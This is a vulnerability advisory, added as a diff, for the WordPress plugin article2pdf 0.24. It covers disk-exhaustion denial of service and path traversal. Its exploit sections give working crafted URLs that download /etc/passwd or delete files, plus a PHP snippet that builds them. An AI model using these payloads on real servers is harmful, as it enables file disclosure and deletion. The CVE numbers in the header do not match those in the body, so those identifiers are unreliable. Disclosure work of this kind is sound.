@@ -1,0 +1,155 @@
+id: 32424
+date: 03/27/2019
+title: WordPress article2pdf 0.24 DoS / File Deletion / Disclosure Vulnerabilities
+author: Christian Lerrahn
+cves: CVE-2019-10000, CVE-2019-10102
+
+Product: article2pdf (Wordpress plug-in)
+Product Website: https://wordpress.org/plugins/article2pdf/
+Affected Versions: 0.24 and greater
+
+The following vulnerabilities were found in a code review of the 
+plug-in. An attempt to contact the
+plug-in maintainer on 8 December 2018 was unsuccessful. The Wordpress 
+security team disabled downloads
+of the plug-in upon notification on 8 January 2019.
+
+I would like to thank Ken Johnson (@cktricky) and Set Law (@sethlaw) 
+whose course
+"Seth & Ken's Excellent Adventures in Secure Code Review" sparked my 
+interest in reviewing code for
+vulnerabilities.
+
+
+
+[CVE-2019-1000031] Generated PDF file is only removed after download 
+which is initiated by a redirect
+=====================================================================================================
+Type:
+-----
+Resource Exhaustion
+
+Description:
+-----------
+The plugin generates a PDF version of a post/article when a link of the
+form
+
+https://www.example.com/.../my-post-title/?article2pdf=1
+
+is visited. The response to this initial request is a redirect to a link
+like
+
+http://www.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=xxx&r=yyy&d=zzz
+
+which will then return the PDF file contents and subsequently delete
+the file.
+
+As the deletion is coupled with the download but the download is
+initiated by a different request than the one which creates the file,
+visiting the link which creates the file and not following the redirect
+results in the file not being deleted. These files can then accumulate
+and potentially exhaust the available disk space.
+
+Depending on the server setup, space exhaustion of a hard drive or hard
+drive partition or even just a disk quota can result in denial of
+service even for unrelated services on the same machine which rely on
+the same resource.
+
+This issue was originally reported on the plugin's bug tracker [2] but
+never identified as a vulnerability.
+
+Exploit
+-------
+Repeatedly visit a PDF generation link the plugin provides without ever
+following the redirect to exhaust disk space.
+
+
+
+[CVE-2019-1010257] PDF file download path is constructed from 
+insufficiently sanitised user input
+=================================================================================================
+Type:
+-----
+Information Disclosure / File Deletion
+
+Description:
+------------
+When visiting the PDF download link which the original PDF generation
+link redirects to, the file path is constructed from a combination of
+fixed strings and the strings provided via the query string of the
+download URL. The download URL has the form
+
+http://www.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=xxx&r=yyy&d=zzz
+
+where xxx is a base64 encoded absolute string, xxx is a short hex hash
+and zzz is the base64 encoded URL title slug of the post the PDF was
+generated from. While the plugin attempts to sanitise these input
+parameters to not allow path traversal, this sanitisation is
+insufficient and can be fully or partially circumvented depending on
+the PHP version the Wordpress instance is running on.
+
+In the case of PHP version <5.3 it is possible to read any file the
+user the plugin is executed under has read access to by just encoding
+the full file path in the parameter "d" and terminating that string
+with a null-byte. The parameter "p" must not be empty but can contain
+any value. The parameter "r" may be empty but its value is of no
+significance. If the user that the script is executed as has write
+access to the file or the directory it is stored in, the file will be
+deleted after it has been downloaded. If the user has no write access,
+an error message may be shown at the end of the file contents
+offered which discloses the Wordpress instance's install directory on
+the server.
+
+In the case of PHP version >=5.3, null-termination will no longer cut
+off the string. As the generated file name ends with a fixed string
+".pdf", only files with that file ending can be read. The parameter "d"
+may be any directory on the server. The parameter "p" needs to contain
+8 backspace characters to delete a prepended fixed string from the file
+name while the parameter "r" must contain exactly one backspace. The
+actual file name (without the ".pdf") can then be appended to the
+backspaces in either parameter "p" or parameter "r". It is also
+possible to have "p" contain one random character and then have 10
+backspace characters followed by the actual file name (again,
+without the ".pdf") stored in parameter "r".
+
+The information above can also be found on the plug-in's issue tracker 
+[3].
+
+Exploit:
+--------
+On PHP <5.3, a specially crafted link like
+
+http://php52.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=YQ==&r=&d=L2V0Yy9wYXNzd2QA
+
+will download the server's /etc/passwd file.
+
+On PHP >=5.3, a specially crafted link like
+
+http://www.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=CAgICAgICAg=&r=%08test&d=L3RtcA==
+
+will return the contents of the file "/tmp/test.pdf" and delete the
+file if the user the script is executed as has permissions to do so.
+
+The link used above can be generated using a few lines of PHP:
+
+     <?php
+     $d52 = base64_encode("/etc/passwd\0");
+     $p52 = base64_encode("a");
+     $r52 = "";
+     echo 
+"http://www.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=${p52}&r=${r52}&d=${d52}\n";
+     $d53 = base64_encode("/tmp");
+     $p53_raw = "";
+     for ($i=0;$i<8; $i++) $p53_raw .= chr(8);
+     $p53 = base64_encode($p53_raw);
+     $r53 = "%08test";
+     echo 
+"http://www.example.com/wp-content/plugins/article2pdf/article2pdf_getfile.php?p=${p53}&r=${r53}&d=${d53}\n";
+
+[1] https://wordpress.org/plugins/article2pdf/
+[2] 
+https://wordpress.org/support/topic/plugin-article2pdf-temporary-files-filling-up-server-space/
+[3] 
+https://wordpress.org/support/topic/pdf-download-path-improperly-sanitised/
+
+#  0day.today [2023-03-22]  #
